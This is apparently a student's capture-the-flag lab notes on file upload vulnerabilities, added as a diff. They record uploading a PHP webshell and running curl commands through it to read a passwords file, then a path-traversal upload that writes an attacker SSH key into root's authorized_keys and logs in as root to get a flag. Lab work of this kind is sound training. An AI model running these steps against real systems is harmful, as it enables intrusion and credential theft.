@@ -1,0 +1,61 @@
+Common web application attacks
+
+File upload vulnerabilities
+
+192.168.66.189/meteor
+
+upload:
+/usr/share/webshells/php/simple-backdoor.pHp
+
+curl http://192.168.66.189/meteor/uploads/simple-backdoor.pHp?cmd=dir
+
+C:\xampp\passwords.txt
+
+curl http://192.168.66.189/meteor/uploads/simple-backdoor.pHp?cmd=dir%20C%3A%5Cxampp
+
+curl http://192.168.66.189/meteor/uploads/simple-backdoor.pHp?cmd=type%20C%3A%5Cxampp%5Cpasswords.txt
+
+https://www.urlencoder.org/
+
+url encode:
+  %20
+: %3A
+\ %5C
+
+User: mountainadmin
+Password: OS{4f1dd4ecd970ac72e59c7a15a6896c18}
+
+------------------
+
+192.168.66.16
+
+ssh-keygen
+fileup
+cat fileup.pub > authorized_keys
+
+cat authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZF4qYDd/zcDVJluhtWBpcKPBn3Xa/kmJgYvHgjruJk kali@kali
+
+
+http://mountaindesserts.com:8000
+
+echo "test" > test.txt
+
+../../../../../../../root/.ssh/authorized_keys
+
+Content-Disposition: form-data; name="myFile"; filename="test.txt"
+
+
+Content-Disposition: form-data; name="myFile"; filename="../../../../../../../root/.ssh/authorized_keys"
+Content-Type: application/octet-stream
+
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZF4qYDd/zcDVJluhtWBpcKPBn3Xa/kmJgYvHgjruJk kali@kali
+
+
+rm ~/.ssh/known_hosts
+ssh -p 2222 -i fileup root@mountaindesserts.com
+yes
+
+cat flag.txt
+
+OS{0cdecaa409c9731eb8bdac02517451f7}
